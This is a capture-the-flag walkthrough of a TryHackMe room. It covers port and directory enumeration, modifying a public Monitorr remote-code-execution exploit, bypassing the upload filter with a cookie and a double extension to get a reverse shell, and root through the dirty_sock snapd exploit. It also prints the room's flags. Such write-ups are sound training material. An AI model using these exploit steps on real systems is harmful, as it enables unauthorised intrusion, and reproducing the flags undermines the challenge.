> Year of the Jelly Fish

# Rustscan

sudo rustscan -a $IP --ulimit=5000 --batch-size=4500 -- -sC -sV -Pn -A -O | tee rustscan.log


```
21/tcp  open  ftp      syn-ack ttl 27 vsftpd 3.0.3
22/tcp  open  ssh      syn-ack ttl 26 OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     syn-ack ttl 27 Apache httpd 2.4.29
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Did not follow redirect to https://robyns-petshop.thm/
443/tcp open  ssl/http syn-ack ttl 26 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Robyn&#039;s Pet Shop
| ssl-cert: Subject: commonName=robyns-petshop.thm/organizationName=Robyns Petshop/stateOrProvinceName=South West/countryName=GB/emailAddress=robyn@robyns-petshop.thm/localityName=Bristol
| Subject Alternative Name: DNS:robyns-petshop.thm, DNS:monitorr.robyns-petshop.thm, DNS:beta.robyns-petshop.thm, DNS:dev.robyns-petshop.thm
| Issuer: commonName=robyns-petshop.thm/organizationName=Robyns Petshop/stateOrProvinceName=South West/countryName=GB/emailAddress=robyn@robyns-petshop.thm/localityName=Bristol
```

When we try to access `http://34.245.35.105` we are prompted with 302 error!

```
<p>The document has moved <a href="https://robyns-petshop.thm/">here</a>.</p>
```

So let's add this to our /etc/hosts file. Let's do further enumeration.

# Dirb

dirb https://robyns-petshop.thm | tee dirb.log


```
==> DIRECTORY: https://robyns-petshop.thm/assets/
+ https://robyns-petshop.thm/business (CODE:401|SIZE:466)              
==> DIRECTORY: https://robyns-petshop.thm/config/ => Must check🚧
==> DIRECTORY: https://robyns-petshop.thm/content/
https://robyns-petshop.thm/plugins/
https://robyns-petshop.thm/themes/
https://robyns-petshop.thm/vendor/
```

# Nmap

sudo nmap -sC -sV -T4 -Pn -p- -O -A -vvv -oN nmap/initial $IP

```
8000/tcp  open  http-alt syn-ack ttl 27
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Length: 15
|_    Request
|_http-favicon: Unknown favicon MD5: 79C1CD72253966068E91FD84A799FED9
|_http-title: Under Development!
8096/tcp  open  unknown  syn-ack ttl 26
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Connection: close
|     Date: Sun, 25 Apr 2021 06:12:00 GMT
|     Server: Kestrel
|     Content-Length: 0
|     X-Response-Time-ms: 257
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Date: Sun, 25 Apr 2021 06:11:27 GMT
|     Server: Kestrel
|     Content-Length: 0
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 302 Found
|     Connection: close
|     Date: Sun, 25 Apr 2021 06:11:28 GMT
|     Server: Kestrel
|     Content-Length: 0
|     Location: /web/index.html
|   Help: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Date: Sun, 25 Apr 2021 06:11:44 GMT
|     Server: Kestrel
|     Content-Length: 0
|   Kerberos, TLSSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Date: Sun, 25 Apr 2021 06:11:46 GMT
|     Server: Kestrel
|     Content-Length: 0
|   LPDString: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Date: Sun, 25 Apr 2021 06:12:00 GMT
|     Server: Kestrel
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 505 HTTP Version Not Supported
|     Connection: close
|     Date: Sun, 25 Apr 2021 06:11:28 GMT
|     Server: Kestrel
|     Content-Length: 0
|   SSLSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Date: Sun, 25 Apr 2021 06:11:45 GMT
|     Server: Kestrel
|_    Content-Length: 0
22222/tcp open  ssh      syn-ack ttl 27 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
```

## Port 8000

```
Under Construction
This site is under development. Please be patient.

If you have been given a specific ID to use when accessing this development site, please put it at the end of the url (e.g. 34.245.35.105:8000/ID_HERE)
```

## Port 8096

We are prompted with JellyFin `A suite of multimedia applications designed to organize, manage, and share digital media files to networked devices. ` We have a login page here too!🧐

## Port 22222 => Also SSH.

Also we got many host names let's check them also!

We have many hostnames if we look at our nmap result. So let's add the to our /etc/hosts file.

```
robyns-petshop.thm => Normal site 
monitorr.robyns-petshop.thm => Monitorr has 2 exploits
beta.robyns-petshop.thm  => Similar to port 8000
dev.robyns-petshop.thm => Similar to port 80
```

Searching for monitorr exploits we get 2 exploits.

```
Monitorr 1.7.6m - Authorization Bypas | php/webapps/48981.py
Monitorr 1.7.6m - Remote Code Executi | php/webapps/48980.py
```

The auth bypass file refers to location `/assets/config/_installation/_register.php?action=register` which we can't access. So Robyn knows the exploits and migigated it. Next RCE exploit refers to a location `/assets/php/upload.php` and we can access this. Looking at the RCE exploit we can see that they change the image header to GIF header and upload it to get around `getimagesize()` .I blankly ran the exploit and got SSL error. So we have to modify the code inorder to run.

1. Change the format of the file to unix format `dos2unix rce.py`
2. Let's avoid the SSL error.

Add these lines below the import modules

```
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
```

3. Get a new session and disable certificate verification.

```
sess = requests.Session()
sess.verify = False
```

4. And finally we change request.get/requests.post to sess.get/sess.post.

On executing it we didn't get a shell and accessing `/assets/data/usrimg` didn't show our `she_ll.php`.  We’ll start with some good-ol’ print-debugging. We’ll set the result of the existing sess.post line to a variable called r then print out the response in text format:

```
r = sess.post(url, headers=headers, data=data)
print(r.text)
```

Running the exploit again, we get a concerning response:

`<div id='uploadreturn'>You are an exploit.</div><div id='uploaderror'>ERROR: she_ll.php was not uploaded.</div></div>`

How the hell does it know that..?

The obvious answer would be with the Python User-Agent — or would be, if the exploit wasn’t explicitly spoofing our user-agent already. Perhaps a cookie?

A review of our browser cookie store (found in the developer tools) would indicate that this is a cookie `isHuman`.Let’s try adding it to the exploit and see what happens. The new post request should look like this:

`r = sess.post(url, headers=headers, data=data, cookies={"isHuman": "1"})`

Well, that’s done it:

`<div id='uploadreturn'><div id='uploaderror'>ERROR: she_ll.php is not an image or exceeds the webserver’s upload size limit.</div><div id='uploaderror'>ERROR: she_ll.php was not uploaded.</div></div>`

We’ve convinced the webapp that we are human, but it’s still not letting us upload anything. That would indicate that Robyn has also upgraded the filter directly, but perhaps she accidentally left a loophole.

## Filter Evasion

By trial and error, it can be ascertained that (in addition to the default getimagesize() filter, two other filters are also in place:

1. A regex to see if php appears in the filename at all. This can be bypassed by using an alternative extension such as .phtml or .phar.
2. An allowlist extension check, apparently splitting on the first period (.). This can be bypassed with a double-barrelled extension — e.g. .jpg.phtml.

Changing some changes we run the shell in port 443 to not be cayght by egress firewall. And we got a shell as www-data.

# flag1.txt 

```
THM{MjBkOTMyZDgzNGZmOGI0Y2I5NTljNGNl}
```

Let's search for outdated software. `apt list --upgradeable`

We got something interesting.

```
snapd/bionic-updates,bionic-security 2.48.3+18.04 amd64 [upgradable from: 2.32.5+18.04]
```

Let's search for exploits in searchsploit. We got 2 exploits and the 1st one requires outbound connection. So moving onto next one. We have to change it to unix format using dos2unix and then we have to transfer it over port 80.

And on executing we have added an account.

```
./dirty_sock.py 

      ___  _ ____ ___ _   _     ____ ____ ____ _  _ 
      |  \ | |__/  |   \_/      [__  |  | |    |_/  
      |__/ | |  \  |    |   ___ ___] |__| |___ | \_ 
                       (version 2)

//=========[]==========================================\\
|| R&D     || initstring (@init_string)                ||
|| Source  || https://github.com/initstring/dirty_sock ||
|| Details || https://initblog.com/2019/dirty-sock     ||
\\=========[]==========================================//


[+] Slipped dirty sock on random socket file: /tmp/phorbmxyuh;uid=0;
[+] Binding to socket file...
[+] Connecting to snapd API...
[+] Deleting trojan snap (and sleeping 5 seconds)...
[+] Installing the trojan snap (and sleeping 8 seconds)...
[+] Deleting trojan snap (and sleeping 5 seconds)...



********************
Success! You can now `su` to the following account and use sudo:
   username: dirty_sock
   password: dirty_sock
********************
```

1. su dirty_sock
2. sudo -s

# Flag2.txt

```
THM{YjMyZTkwYzZhM2U5MGEzZDU2MDc1NTMx}	
```